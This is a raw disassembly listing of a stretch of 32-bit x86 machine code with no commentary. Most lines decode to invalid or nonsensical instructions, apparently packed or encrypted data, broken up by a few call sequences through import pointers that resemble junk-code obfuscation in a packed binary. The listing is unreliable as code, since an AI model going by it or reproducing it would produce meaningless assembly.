  4038be:	fisttp WORD PTR [ebx+ecx*1+0x4db83fa3]
  4038c5:	popf   
  4038c6:	(bad)  
  4038c7:	in     al,0x31
  4038c9:	pop    edx
  4038ca:	sbb    al,BYTE PTR [ebp+ebp*4+0x9e4917a]
  4038d1:	fiadd  WORD PTR [eax+edx*8]
  4038d4:	(bad)  
  4038d5:	stc    
  4038d6:	out    0xdd,al
  4038d8:	jne    0x403888
  4038da:	add    al,0x59
  4038dc:	not    BYTE PTR [ecx*2+0x66cf314]
  4038e3:	or     esi,DWORD PTR [edx+ecx*2]
  4038e6:	sub    DWORD PTR [eax+0x2a045ae2],edx
  4038ec:	rcl    DWORD PTR [ecx-0x7590c989],0x6f
  4038f3:	xor    ebx,edx
  4038f5:	or     eax,0x9e56f245
  4038fa:	loop   0x4038aa
  4038fc:	idiv   DWORD PTR [edx-0x16]
  4038ff:	mov    ds,WORD PTR [eax+eiz*8-0x28ade586]
  403906:	jle    0x403892
  403908:	js     0x403942
  40390a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40390b:	hlt    
  40390c:	repnz mov bl,0x2b
  40390f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403910:	mov    ss,WORD PTR [edi-0x5475e3b8]
  403916:	stos   DWORD PTR es:[edi],eax
  403917:	and    al,0x6b
  403919:	sbb    bh,BYTE PTR [edi+esi*2-0x43c59b2f]
  403920:	and    edi,DWORD PTR [eax+0x7b72a29e]
  403926:	jnp    0x403952
  403928:	adc    dh,BYTE PTR [ecx-0x417d4761]
  40392e:	sti    
  40392f:	push   0x35
  403931:	and    al,BYTE PTR [edi]
  403933:	push   ebp
  403934:	jno    0x4039a5
  403936:	pusha  
  403937:	cmp    DWORD PTR [ecx+0x2e5fed68],ebx
  40393d:	push   cs
  40393e:	shl    BYTE PTR [ebx-0x36805b1d],1
  403944:	lldt   WORD PTR [eax]
  403947:	std    
  403948:	js     0x4038cb
  40394a:	inc    edi
  40394b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40394c:	and    edx,DWORD PTR [ecx-0x9804153]
  403952:	fld    TBYTE PTR [esi-0x2f]
  403955:	bound  edx,QWORD PTR [edx+0xc67029c]
  40395b:	in     al,0x16
  40395d:	or     al,0xd0
  40395f:	add    eax,0xcc1f532b
  403964:	retf   
  403965:	inc    edx
  403966:	cs (bad) 
  403968:	sbb    dh,ah
  40396a:	sbb    al,0xee
  40396c:	mov    ebx,DWORD PTR cs:[edx-0x1449ba6c]
  403973:	lock sbb DWORD PTR [edx-0x26d418bb],esi
  40397a:	cmp    DWORD PTR ds:0x4335fc,0x0
  403981:	jle    0x4039ab
  403987:	sbb    DWORD PTR ds:0x433650,0x43356c
  403991:	xor    ecx,edx
  403993:	jmp    0x4039ab
  403998:	push   0x1fc1
  40399d:	push   DWORD PTR [ebp-0x24]
  4039a0:	push   0x5d0f
  4039a5:	call   DWORD PTR ds:0x43c82c
  4039ab:	add    DWORD PTR [eax],ebx
  4039ad:	jmp    0x403a85
  4039b2:	das    
  4039b3:	in     eax,dx
  4039b4:	sub    BYTE PTR [edx-0x3e],0x6f
  4039b8:	out    dx,eax
  4039b9:	in     eax,dx
  4039ba:	addr16 pop edx
  4039bc:	repnz pop edi
  4039be:	js     0x403955
  4039c0:	div    DWORD PTR [ebx]
  4039c2:	(bad)  
  4039c3:	adc    al,BYTE PTR [eax]
  4039c5:	add    BYTE PTR [ebx-0x1c000000],bh
  4039cb:	sahf   
  4039cc:	nop
  4039cd:	jg     0x403993
  4039cf:	ret    0x77e9
  4039d2:	js     0x4039be
  4039d4:	daa    
  4039d5:	pop    ecx
  4039d6:	or     DWORD PTR [ecx],esi
  4039d8:	daa    
  4039d9:	fcomp  QWORD PTR [ecx+0x37]
  4039dc:	popa   
  4039dd:	out    0xe9,al
  4039df:	repz fs faddp st(7),st
  4039e3:	test   eax,0x17f0485e
  4039e8:	nop
  4039e9:	mov    cl,0xf0
  4039eb:	and    dh,bh
  4039ed:	xchg   edi,eax
  4039ee:	mov    al,ds:0x92790ac4
  4039f3:	mov    ds:0x74288e21,eax
  4039f8:	add    edi,edx
  4039fa:	test   BYTE PTR [eax+0x5c],0x54
  4039fe:	add    al,0xdb
  403a00:	in     eax,dx
  403a01:	cld    
  403a02:	mul    DWORD PTR [edi]
  403a04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403a05:	sbb    BYTE PTR [ebx-0x67b11ab4],bh
  403a0b:	mov    eax,ds:0x29254406
  403a10:	pop    es
  403a11:	mov    al,0x16
  403a13:	(bad)  
  403a14:	(bad)  
  403a15:	xor    BYTE PTR [eax],ch
  403a17:	sub    BYTE PTR [edx],cl
  403a19:	mov    ebx,0x11415674
  403a1e:	ret    
  403a1f:	shl    BYTE PTR ds:0xe867214a,cl
  403a25:	ins    BYTE PTR es:[edi],dx
  403a26:	jmp    0xdc0ab3e1
  403a2b:	add    eax,0xc2166239
  403a30:	inc    esi
  403a31:	pop    esp
  403a32:	sbb    BYTE PTR [edx-0x1d],0xdb
  403a36:	push   0x286513ef
  403a3b:	jmp    0xbdc3:0x91c988b2
  403a42:	inc    esp
  403a43:	dec    eax
  403a44:	xchg   ebx,edi
  403a46:	loope  0x4039cb
  403a48:	jns    0x4039f9
  403a4a:	push   esi
  403a4b:	mov    esi,0xc3a4ba5c
  403a50:	fild   WORD PTR [edi+0x33]
  403a53:	sbb    dh,BYTE PTR [edi+ecx*2-0x4cdee276]
  403a5a:	loop   0x4039e1
  403a5c:	test   DWORD PTR [ebx-0x2f],edx
  403a5f:	nop
  403a60:	cdq    
  403a61:	ins    DWORD PTR es:[edi],dx
  403a62:	rol    BYTE PTR [edx-0x64e34edf],1
  403a68:	dec    ebx
  403a69:	fldenv [eax]
  403a6b:	sbb    ch,ah
  403a6d:	(bad)  
  403a6e:	mov    ecx,0x6978608
  403a73:	iret   
  403a74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a75:	inc    ax
  403a77:	pusha  
  403a78:	jno    0x403a77
  403a7a:	dec    edx
  403a7b:	adc    ah,BYTE PTR ds:0x8b773cb3
  403a81:	dec    edi
  403a82:	sub    eax,0x78bfe5f
  403a87:	mov    ecx,DWORD PTR [edi+0x4]
  403a8a:	jmp    0x403b62
  403a8f:	f2xm1  
  403a91:	out    0x87,eax
  403a93:	out    dx,eax
  403a94:	xchg   edi,eax
  403a95:	stc    
  403a96:	inc    BYTE PTR [esi]
  403a98:	xchg   esi,eax
  403a99:	push   ebp
  403a9a:	addr16 jle 0x403ac6
  403a9d:	pop    eax
  403a9e:	fidivr WORD PTR [ecx-0x44ffffed]
  403aa4:	add    BYTE PTR [eax],al
  403aa6:	add    BYTE PTR [ebx+0x7],dh
  403aa9:	loop   0x403aae
  403aab:	xchg   edx,eax
  403aac:	dec    ecx
  403aad:	xor    cl,BYTE PTR [esi+0x52]
  403ab0:	aas    
  403ab1:	xchg   ebx,ecx
  403ab3:	cld    
  403ab4:	sbb    BYTE PTR [edi-0x7cb42de],0x3a
  403abb:	or     eax,0x684806f8
  403ac0:	(bad)  
  403ac1:	dec    esp
  403ac2:	or     DWORD PTR [esi],edi
  403ac4:	xchg   BYTE PTR [edx+ebp*2+0x1591cba0],ah
  403acb:	inc    esp
  403acc:	loope  0x403b3c
  403ace:	test   BYTE PTR [eax+0x223dd22e],cl
  403ad4:	fdiv   QWORD PTR [eax+0x6049feec]
  403ada:	ja     0x403b2f
  403adc:	and    DWORD PTR [ebx-0x29e6588],ebx
  403ae2:	mov    al,0xab
  403ae4:	test   eax,0xa41bf330
  403ae9:	or     DWORD PTR [ecx],0xffc0ac61
  403aef:	shl    DWORD PTR [ecx],1
  403af1:	sub    BYTE PTR [edi+0x6e6cbba6],0x64
  403af8:	int3   
  403af9:	stos   DWORD PTR es:[edi],eax
  403afa:	jg     0x403b56
  403afc:	inc    edx
  403afd:	add    ah,BYTE PTR [ecx+0x32c4cc59]
  403b03:	je     0x403b40
  403b05:	cwde   
  403b06:	cmp    DWORD PTR [ebx],esp
  403b08:	sbb    eax,esi
  403b0a:	mov    eax,0x3aaefa18
  403b0f:	ret    0x14a0
  403b12:	or     edx,DWORD PTR [ebp-0xb]
  403b15:	sbb    eax,esp
  403b17:	inc    edi
  403b18:	ins    DWORD PTR es:[edi],dx
  403b19:	outs   dx,WORD PTR ds:[esi]
  403b1b:	hlt    
  403b1c:	pop    ss
  403b1d:	test   eax,0x9a23a394
  403b22:	push   esp
  403b23:	in     eax,dx
  403b24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b25:	in     al,dx
  403b26:	pop    ebp
  403b27:	cmp    BYTE PTR [ebp+0x2f],bl
  403b2a:	lar    edi,WORD PTR [ecx+edx*4-0x28]
  403b2f:	pop    ds
  403b30:	data16 jne 0x403b63
  403b33:	call   0xf27344d6
  403b38:	sbb    DWORD PTR [edx],edi
  403b3a:	push   ebx
  403b3b:	out    dx,al
  403b3c:	push   ebp
  403b3d:	scas   eax,DWORD PTR es:[edi]
  403b3e:	push   0x5d
  403b40:	retf   
  403b41:	inc    esi
  403b42:	push   ebp
  403b43:	adc    ch,BYTE PTR [ebp+edx*1+0x1f34eadd]
  403b4a:	push   esi
  403b4b:	sbb    eax,0xb8cebf61
  403b50:	sahf   
  403b51:	sbb    BYTE PTR [ebx-0x4e],0x82
  403b55:	pop    ebx
  403b56:	addr16 nop
  403b58:	ror    edi,cl
  403b5a:	push   es
  403b5b:	inc    ecx
  403b5c:	sbb    eax,0xfd28ca3b
  403b61:	js     0x403b96
  403b63:	(bad)  
  403b64:	mov    ebx,0xacff
  403b69:	movzx  edx,BYTE PTR ds:0x433558
  403b70:	sbb    DWORD PTR ds:0x433644,edx
  403b76:	xor    ecx,ebx
  403b78:	cmp    DWORD PTR ds:0x4335c4,0x0
  403b7f:	jbe    0x403bb8
  403b85:	and    edx,0x1359
  403b8b:	jmp    0x403bb8
  403b90:	push   0x1616
  403b95:	push   0x4335a4
  403b9a:	push   DWORD PTR [ebp-0x14]
  403b9d:	push   0x433544
  403ba2:	push   0x5942
  403ba7:	push   DWORD PTR [ebp-0x14]
  403baa:	push   DWORD PTR [ebp-0x10]
  403bad:	push   0x58d1
  403bb2:	call   DWORD PTR ds:0x43c80c
  403bb8:	add    eax,0x99b8624d
  403bbd:	adc    ecx,0x8ddc
  403bc3:	mov    DWORD PTR [ebp-0x60],eax
  403bc6:	jmp    0x403c9e
  403bcb:	mov    al,ds:0xf4cfe414
  403bd0:	jmp    FWORD PTR [ebx+0x680b447f]
  403bd6:	lahf   
  403bd7:	inc    esi
  403bd8:	cmp    DWORD PTR [ecx+0x1474a5],edi
  403bde:	add    BYTE PTR [ebx+0x6d000000],bh
  403be4:	sbb    bh,dl
  403be6:	jl     0xc7d89d42
  403bec:	iret   
  403bed:	ret    0x3d65
  403bf0:	out    dx,al
  403bf1:	sbb    eax,0x82b8c2e2
  403bf6:	xor    dh,ch
  403bf8:	int    0xb1
  403bfa:	je     0x403c65
  403bfc:	pop    ds
  403bfd:	fcmovu st,st(5)
  403bff:	and    BYTE PTR [edx],bl
  403c01:	inc    ecx
  403c02:	sub    ah,BYTE PTR [ebx+0x320ec37e]
  403c08:	aaa    
  403c09:	retf   0xcf85
  403c0c:	in     al,dx
  403c0d:	mov    al,ds:0xf6cecfdf
  403c12:	pop    es
  403c13:	jge    0x403c78
  403c15:	mov    bh,0xba
  403c17:	gs inc ebp
  403c19:	out    dx,al
  403c1a:	xchg   ebx,eax
  403c1b:	lods   al,BYTE PTR ds:[esi]
  403c1c:	cmp    DWORD PTR [edx+0x13b1cf1e],0x61
  403c23:	out    dx,al
  403c24:	stos   DWORD PTR es:[edi],eax
  403c25:	aam    0xf9
  403c27:	pop    edx
  403c28:	and    eax,DWORD PTR [ebx+0xa337fb1]
  403c2e:	mov    al,0xc9
  403c30:	test   al,0xa5
  403c32:	or     BYTE PTR [ebx+0x35],0xa7
  403c36:	jae    0x403c1a
  403c38:	fwait
  403c39:	call   0x1d9:0x64ed682e
  403c40:	fld    QWORD PTR [ecx+0x46]
  403c43:	arpl   WORD PTR [ebx+0x7b726379],bx
  403c49:	cli    
  403c4a:	push   0x2a025473
  403c4f:	dec    ebp
  403c50:	jmp    0xf02bc157
  403c55:	and    eax,DWORD PTR [eax-0x1]
  403c58:	cmp    BYTE PTR [eax],0x9d
  403c5b:	sahf   
  403c5c:	arpl   bx,si
  403c5e:	xor    dh,BYTE PTR [eax+0x1b4db7be]
  403c64:	sub    al,0x18
  403c66:	jle    0x403bef
  403c68:	mov    cl,0xb
  403c6a:	loope  0x403c34
  403c6c:	mov    edx,ebp
  403c6e:	ja     0x403c35
  403c70:	fcmovbe st,st(3)
  403c72:	arpl   WORD PTR [ebx],cx
  403c74:	dec    edx
  403c75:	outs   dx,BYTE PTR ds:[esi]
  403c76:	jecxz  0x403bff
  403c78:	xchg   edi,eax
  403c79:	jbe    0x403c89
  403c7b:	out    0xfc,al
  403c7d:	cmp    esi,DWORD PTR [ecx]
  403c7f:	ja     0x403cc8
  403c81:	pop    ecx
  403c82:	sbb    ah,bl
  403c84:	mov    ecx,0xd9e8abee
  403c89:	push   ss
  403c8a:	sbb    BYTE PTR [esi],ch
  403c8c:	fdivr  DWORD PTR ds:0x67cc2bb1
  403c92:	cmc    
  403c93:	out    0xfc,eax
  403c95:	gs out dx,al
  403c97:	inc    ecx
  403c98:	and    BYTE PTR [eax],ah
  403c9a:	jl     0x403cad
  403c9c:	ror    DWORD PTR [ecx-0x165bb277],1
  403ca2:	rol    DWORD PTR [eax],cl
  403ca4:	add    BYTE PTR [eax],al
  403ca6:	or     esi,DWORD PTR [ecx]
  403ca8:	popa   
  403ca9:	fdivr  QWORD PTR [ebx-0x24]
  403cac:	mov    edi,0xb5a4aef7
  403cb1:	ret    
  403cb2:	repnz stos DWORD PTR es:[edi],eax
  403cb4:	loop   0x403c83
  403cb6:	das    
  403cb7:	adc    eax,0xbb0000
  403cbc:	add    BYTE PTR [eax],al
  403cbe:	or     esp,esp
  403cc0:	ret    
  403cc1:	mov    eax,ds:0x1b2da2ce
  403cc6:	sti    
  403cc7:	bound  edi,QWORD PTR [edx]
  403cc9:	jae    0x403d2d
  403ccb:	(bad)  [edx+eax*2-0x27]
  403ccf:	mov    edi,0xe39b5931
  403cd4:	lods   eax,DWORD PTR ds:[esi]
  403cd5:	dec    esp
  403cd6:	push   cs
  403cd7:	mov    edx,0x889f1b9d
  403cdc:	xchg   ecx,eax
  403cdd:	loope  0x403c87
  403cdf:	mov    ebp,0xb35bbda3
  403ce4:	xchg   esi,eax
  403ce5:	cmp    al,bh
  403ce7:	cwde   
  403ce8:	shl    BYTE PTR [eax],0xa3
  403ceb:	ds loope 0x403cc3
  403cee:	in     eax,0x56
  403cf0:	(bad)  
  403cf1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403cf2:	es pusha 
  403cf4:	ret    0x34bd
  403cf7:	les    ecx,FWORD PTR [esi+0x28dc9218]
  403cfd:	jmp    0x346bf7e5
  403d02:	daa    
  403d03:	leave  
  403d04:	ficomp DWORD PTR [ebx]
  403d06:	and    eax,0xf5f6bc9a
  403d0b:	ja     0x403d8b
  403d0d:	not    DWORD PTR [eax]
  403d0f:	dec    esp
  403d10:	sub    ch,bl
  403d12:	xchg   BYTE PTR [ecx],dl
  403d14:	fwait
  403d15:	sub    ah,ah
  403d17:	sbb    eax,DWORD PTR [esi+0x2d]
  403d1a:	lock cmp dh,BYTE PTR [ecx]
  403d1d:	xchg   DWORD PTR [ebx+0x70fb779d],eax
  403d23:	cmp    ch,BYTE PTR [edx-0x1de32c4d]
  403d29:	aam    0x7
  403d2b:	push   ss
  403d2c:	jle    0x403ce2
  403d2e:	mov    edx,0x8a31e5e5
  403d33:	shl    DWORD PTR [ebx+ebp*4-0x730279e2],1
  403d3a:	mov    es,WORD PTR [ebx]
  403d3c:	dec    esp
  403d3d:	push   0xbefabcc5
  403d42:	int3   
  403d43:	mov    eax,ds:0xd74795d5
  403d48:	cwde   
  403d49:	inc    eax
  403d4a:	jb     0x403cd7
  403d4c:	(bad)  
  403d4d:	jecxz  0x403d5a
  403d4f:	in     al,dx
  403d50:	test   al,0x40
  403d52:	xor    dl,BYTE PTR [ebx]
  403d54:	or     al,0x4a
  403d56:	mov    eax,ds:0xa00cbf31
  403d5b:	ficom  DWORD PTR [esp+edi*2+0x47f1a076]
  403d62:	sar    BYTE PTR es:[ecx+0x67],cl
  403d66:	add    BYTE PTR [edx-0x59ad41fb],dh
  403d6c:	fbstp  TBYTE PTR [edx]
  403d6e:	mov    cl,BYTE PTR [ebp+0x16212d14]
  403d74:	push   ss
  403d75:	mov    al,ds:0x8b53b9ec
  403d7a:	dec    ebp
  403d7b:	adc    al,0x8b
  403d7d:	add    edi,esi
  403d7f:	shr    cl,cl
  403d81:	rol    DWORD PTR [eax],cl
  403d83:	add    BYTE PTR [eax],al
  403d85:	and    ch,al
  403d87:	and    DWORD PTR [edi-0x15],esp
  403d8a:	out    dx,eax
  403d8b:	in     ax,dx
  403d8d:	aam    0x49
  403d8f:	push   es
  403d90:	or     eax,0xe423cbd2
  403d95:	jmp    0x0:0xbb000015
  403d9c:	add    BYTE PTR ds:0xbf6cf574,bl
  403da2:	repnz (bad) 
  403da4:	xor    ecx,DWORD PTR [eax-0x43]
  403da7:	xchg   DWORD PTR [ebx+0x29],ebx
  403daa:	adc    eax,0xe07e6ecc
  403daf:	adc    BYTE PTR [eax+esi*1+0xe7eaa9e],ch
  403db6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403db7:	rcl    DWORD PTR [edi+0x37],1
  403dba:	(bad)  
  403dbb:	outs   dx,DWORD PTR ds:[esi]
  403dbc:	jne    0x403d78
  403dbe:	stc    
  403dbf:	hlt    
  403dc0:	and    eax,0xe873efae
  403dc5:	or     eax,0xecd04995
  403dca:	push   ebx
  403dcb:	xor    eax,0x4c13e3db
  403dd0:	lea    edx,[eax-0xf]
  403dd3:	test   ebx,0xaaac758c
  403dd9:	or     BYTE PTR [edi],dh
  403ddb:	scas   eax,DWORD PTR es:[edi]
  403ddc:	jno    0x403def
  403dde:	push   ebx
  403ddf:	inc    esi
  403de0:	(bad)  
  403de1:	dec    eax
  403de2:	add    al,0x6
  403de4:	addr16 sbb eax,0xff7fc59c
  403dea:	bound  ecx,QWORD PTR [edi]
  403dec:	or     DWORD PTR [edi],0x823f8424
  403df2:	fld    QWORD PTR [esi-0x1ed97f0e]
  403df8:	stos   DWORD PTR es:[edi],eax
  403df9:	pop    esp
  403dfa:	xchg   esp,eax
  403dfb:	in     eax,0x35
  403dfd:	xchg   edi,eax
  403dfe:	push   edi
  403dff:	scas   eax,DWORD PTR es:[edi]
  403e00:	add    esi,DWORD PTR [edi+0x78]
  403e03:	sahf   
  403e04:	sbb    esp,0xfffffff5
  403e07:	in     eax,0xd7
  403e09:	and    eax,0x84248403
  403e0e:	push   edi
  403e0f:	shl    DWORD PTR [ecx-0x80],0xa9
  403e13:	push   es
  403e14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e15:	cld    
  403e16:	pop    edx
  403e17:	sub    al,0xc9
  403e19:	adc    ch,BYTE PTR [eax+0x21]
  403e1c:	add    DWORD PTR [ebp*2-0x3deae26b],edx
  403e23:	fst    QWORD PTR [ebp-0x47]
  403e26:	mov    bh,0x81
  403e28:	test   al,0xd0
  403e2a:	lahf   
  403e2b:	pop    es
  403e2c:	int3   
  403e2d:	addr16 dec esp
  403e2f:	inc    ecx
  403e30:	dec    BYTE PTR [eax+esi*1+0x1a]
  403e34:	iret   
  403e35:	xor    ch,ch
  403e37:	mov    ebx,0x839c414a
  403e3c:	sbb    dl,cl
  403e3e:	and    eax,0x63e4ac9
  403e43:	pop    edi
  403e44:	(bad)
  403e48:	rcl    edi,0xf6
  403e4b:	neg    BYTE PTR [edx]
  403e4d:	out    dx,al
  403e4e:	pop    edi
  403e4f:	mov    ebx,0x10fbda56
  403e54:	jno    0x403eb3
  403e56:	bound  eax,QWORD PTR [ebx+ecx*4+0x51]
  403e5a:	add    al,0x33
  403e5c:	mov    BYTE PTR [ecx+0x43353405],0x0
  403e63:	mov    ebp,0x33000009
  403e68:	rol    DWORD PTR ds:0x99b8624d,cl
  403e6e:	jmp    0x403f46
  403e73:	xor    al,0xfb
  403e75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403e76:	aaa    
  403e77:	out    dx,eax
  403e78:	jg     0x403e2e
  403e7a:	sti    
  403e7b:	mov    ch,0x9d
  403e7d:	or     esi,DWORD PTR [eax+0x23]
  403e80:	int    0xfb
  403e82:	ret    
  403e83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e84:	push   ss
  403e85:	add    BYTE PTR [eax],al
  403e87:	mov    ebx,0xa1000000
  403e8c:	int    0x94
  403e8e:	data16 (bad) 
  403e90:	repnz sbb ah,BYTE PTR [ebx*4+0x535e4c11]
  403e98:	popf   
  403e99:	es dec eax
  403e9b:	adc    edi,DWORD PTR [edi+0x56e6e44c]
  403ea1:	sub    al,0x1c
  403ea3:	push   eax
  403ea4:	jl     0x403e99
  403ea6:	push   ds
  403ea7:	fimul  WORD PTR ds:0xbbdc185c
  403ead:	inc    ecx
  403eae:	pop    ecx
  403eaf:	pusha  
  403eb0:	jae    0x403e84
  403eb2:	pushf  
  403eb3:	inc    ecx
  403eb4:	loope  0x403ec8
  403eb6:	xor    al,BYTE PTR [ebp-0x1087d474]
  403ebc:	aad    0xa4
  403ebe:	sbb    DWORD PTR [edi+0x3d],ebp
  403ec1:	fwait
  403ec2:	jne    0x403ea4
  403ec4:	(bad)  
  403ec5:	and    DWORD PTR [edi],eax
  403ec7:	pop    ebp
  403ec8:	sub    eax,0xafaef660
  403ecd:	jbe    0x403ed3
  403ecf:	push   esp
  403ed0:	sbb    al,0x52
  403ed2:	(bad)  
  403ed3:	jo     0x403e95
  403ed5:	not    BYTE PTR [edx]
  403ed7:	xchg   al,bh
  403ed9:	jmp    0x403f36
  403edb:	int    0x6c
  403edd:	lods   eax,DWORD PTR ds:[esi]
  403ede:	mov    dh,ch
  403ee0:	(bad)  [esi+0x11a8afaa]
  403ee6:	retf   
  403ee7:	out    dx,eax
  403ee8:	(bad)  [eax-0x31]
  403eeb:	fldcw  WORD PTR [eax-0x1725cf6c]
  403ef1:	stos   BYTE PTR es:[edi],al
  403ef2:	push   es
  403ef3:	in     al,dx
  403ef4:	retf   
  403ef5:	ds pop esi
  403ef7:	sub    edi,DWORD PTR [esi+0x6780aae9]
  403efd:	jnp    0x403e9d
  403eff:	adc    al,0xa1
  403f01:	mov    al,0xfd
  403f03:	jmp    0x368b7860
  403f08:	adc    esi,edi
  403f0a:	mov    eax,0xa5e1919e
  403f0f:	hlt    
  403f10:	or     ebp,DWORD PTR ds:0x595afd0d
  403f16:	xchg   DWORD PTR [ecx],esi
  403f18:	test   DWORD PTR [eax],esp
  403f1a:	pop    edx
  403f1b:	or     esi,DWORD PTR [edx-0x45]
  403f1e:	mov    ecx,0x71d55ef0
  403f23:	or     BYTE PTR [esp+ecx*2-0x44],ah
  403f27:	repnz mov ds:0x1fd53567,eax
  403f2d:	mov    esp,0xa74bd985
  403f32:	dec    ebx
  403f33:	dec    eax
  403f34:	jmp    0x99baa884
  403f39:	loope  0x403ec1
  403f3b:	std    
  403f3c:	sbb    BYTE PTR [ebp+0x76],ch
  403f3f:	xchg   esp,eax
  403f40:	mov    ch,0x35
  403f42:	bound  ecx,QWORD PTR [ebx-0x23]
  403f45:	lock adc edx,0x8ddc
  403f4c:	mov    DWORD PTR ds:0x433588,0x13ad
  403f56:	mov    DWORD PTR [ebp-0x54],edx
  403f59:	mov    DWORD PTR ds:0x4335a0,0x5b9f
  403f63:	cmp    DWORD PTR [ebp-0x60],eax
  403f66:	mov    DWORD PTR ds:0x433538,0x30b1
  403f70:	jne    0x404065
  403f76:	not    eax
  403f78:	mov    eax,edx
  403f7a:	mov    DWORD PTR ds:0x43355c,0x4c11
  403f84:	cmp    DWORD PTR [ebp-0x5c],eax
  403f87:	je     0x4046df
  403f8d:	jmp    0x404065
  403f92:	repz inc esi
  403f94:	pop    ecx
  403f95:	mov    ch,0xfd
  403f97:	mov    edi,0x740b46ff
  403f9c:	xor    eax,0x2650b5e4
  403fa1:	jo     0x404003
  403fa3:	pop    ss
  403fa4:	add    BYTE PTR [eax],al
  403fa6:	mov    ebx,0x70000000
  403fab:	xor    ecx,DWORD PTR ds:0x26ab9b46
  403fb1:	mov    bl,0x6b
  403fb3:	js     0x404009
  403fb5:	gs jb  0x40401a
  403fb8:	jmp    0xe79d:0x2117df35
  403fbf:	mov    ?,WORD PTR [eax]
  403fc1:	mov    esp,edx
  403fc3:	jmp    0x122f:0xdb8f753f
  403fca:	mov    dh,0x8c
  403fcc:	scas   eax,DWORD PTR es:[edi]
  403fcd:	and    DWORD PTR [edi+ebx*8+0x39e76578],edx
  403fd4:	leave  
  403fd5:	and    ch,BYTE PTR [eax-0x2e]
  403fd8:	call   0x8d448c50
  403fdd:	or     al,0x50
  403fdf:	pop    edi
  403fe0:	inc    DWORD PTR [edx+0x16]
  403fe3:	and    DWORD PTR [ebp+0x7a],0xffffffca
  403fe7:	push   esi
  403fe8:	int    0x4e
  403fea:	dec    edi
  403feb:	adc    eax,eax
  403fed:	call   0x19728130
  403ff2:	bnd jl 0x404009
  403ff5:	or     esp,esi
  403ff7:	push   cs
  403ff8:	(bad)  
  403ff9:	or     eax,0x5ff233f4
  403ffe:	push   es
  403fff:	outs   dx,BYTE PTR ds:[esi]
  404000:	jle    0x403f86
  404002:	mov    eax,ds:0x44cfaaef
  404007:	sbb    eax,0x32ae818d
  40400c:	rcr    cl,cl
  40400e:	lahf   
  40400f:	stc    
  404010:	push   cs
  404011:	jno    0x403fb7
  404013:	cmc    
  404014:	cmc    
  404015:	mov    eax,ds:0xd09c36fe
  40401a:	jg     0x40408f
  40401c:	daa    
  40401d:	xor    al,0x6f
  40401f:	aad    0xd6
  404021:	push   cs
  404022:	or     DWORD PTR [ebx],ebp
  404024:	ja     0x404067
  404026:	xchg   ebx,eax
  404027:	sti    
  404028:	add    al,0xd9
  40402a:	jbe    0x404080
  40402c:	mov    WORD PTR [ecx+0x5c],gs
  40402f:	sub    eax,0xe87a6ec8
  404034:	sub    eax,0x5b1d3741
  404039:	push   ecx
  40403a:	sub    al,BYTE PTR ds:0xf3eb7483
  404040:	mov    ah,0x38
  404042:	scas   eax,DWORD PTR es:[edi]
  404043:	shl    BYTE PTR [edx-0x4f9df6d5],cl
  404049:	lock push 0xd8f95f2b
  40404f:	lods   eax,DWORD PTR ds:[esi]
  404050:	popf   
  404051:	ss std 
  404053:	pop    ebp
  404054:	and    BYTE PTR [ecx+0x24e8d9d1],dh
  40405a:	xchg   ebx,eax
  40405b:	ss jns 0x40406b
  40405e:	xor    BYTE PTR [esi+0x78e40622],dh
  404064:	add    bh,0x45
  404067:	mov    al,0xa9
  404069:	sbb    al,0xfe
  40406b:	adc    BYTE PTR [ebx+0x4335d43d],al
  404071:	add    BYTE PTR [eax],al
  404073:	jl     0x404184
  404079:	mov    edx,DWORD PTR ds:0x4336a0
  40407f:	mov    eax,ds:0x42f034
  404084:	sub    eax,edx
  404086:	add    edx,DWORD PTR [edx+eax*1]
  404089:	jmp    0x404184
  40408e:	push   DWORD PTR [ebp-0x20]
  404091:	push   0x433624
  404096:	push   0x42ed4a
  40409b:	push   DWORD PTR [ebp-0x1c]
  40409e:	push   DWORD PTR [ebp-0x20]
  4040a1:	push   0x67e9
  4040a6:	call   DWORD PTR ds:0x43c810
  4040ac:	jmp    0x404184
  4040b1:	xchg   ebx,eax
  4040b2:	pop    eax
  4040b3:	sbb    BYTE PTR [ebx],bl
  4040b5:	fistp  DWORD PTR [ebx-0x6d]
  4040b8:	fdiv   st,st(1)
  4040ba:	push   0xbf54a456
  4040bf:	mov    edx,0x181b0d
  4040c4:	add    BYTE PTR [ebx-0x10000000],bh
  4040ca:	retf   
  4040cb:	mov    bh,al
  4040cd:	adc    BYTE PTR [edx+edi*1+0x76],0x5e
  4040d2:	push   0xffffffb4
  4040d4:	and    al,0xc3
  4040d6:	push   0x2a
  4040d8:	push   0x1ca3f0c8
  4040dd:	int3   
  4040de:	lahf   
  4040df:	out    dx,eax
  4040e0:	xor    esi,DWORD PTR [ebp+0x1b1b3c9]
  4040e6:	lods   eax,DWORD PTR ds:[esi]
  4040e7:	fidiv  DWORD PTR ds:0xfb446645
  4040ed:	mov    esp,0xd1705c0d
  4040f2:	xchg   edx,eax
  4040f3:	add    DWORD PTR [ecx-0x2db61b69],esp
  4040f9:	mov    al,0x58
  4040fb:	mov    eax,0xd17888a4
  404100:	push   0xffffff9f
  404102:	(bad)  [eax]
  404104:	adc    ebp,0xfffffff9
  404107:	adc    ebp,eax
  404109:	push   0x538ad38d
  40410e:	in     al,dx
  40410f:	push   ecx
  404110:	xor    al,0xf8
  404112:	sub    BYTE PTR [ebx],dh
  404114:	out    dx,al
  404115:	inc    edi
  404116:	mov    DWORD PTR [ebp-0xb],0x68465902
  40411d:	sbb    BYTE PTR [edi+0x57],dh
  404120:	in     eax,dx
  404121:	rol    BYTE PTR [eax-0x3f106e17],cl
  404127:	popf   
  404128:	pop    edi
  404129:	or     ecx,0x40
  40412c:	das    
  40412d:	das    
  40412e:	push   ds
  40412f:	pop    ecx
  404130:	pop    ecx
  404131:	cwde   
  404132:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404133:	jge    0x404128
  404135:	and    al,0xd0
  404137:	xor    al,0xd3
  404139:	ja     0x4040e9
